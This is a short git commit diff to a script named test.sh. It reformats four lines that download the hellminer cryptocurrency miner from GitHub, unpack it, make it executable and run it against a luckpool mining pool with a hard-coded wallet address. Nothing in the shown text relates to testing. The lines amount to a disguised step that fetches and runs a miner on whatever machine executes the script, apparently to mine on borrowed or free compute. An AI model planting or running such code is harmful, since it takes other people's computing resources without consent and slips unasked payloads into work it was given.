cdfb7283124b0124d4a219ecb628badad658f9bc
zeshan5555 <88017843+zeshan5555@users.noreply.github.com>
2021-08-22 08:17:42 +0500

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,4 +1,4 @@
-!wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-!tar -xf hellminer_cpu_linux.tar.gz
-!chmod +x hellminer
-!./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RMvS7QUDtjzcVh7w8RugbgyqHDBbykTNu1.amzon -p x --cpu 2
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar -xf hellminer_cpu_linux.tar.gz
+chmod +x hellminer
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RMvS7QUDtjzcVh7w8RugbgyqHDBbykTNu1.amzon -p x --cpu 2
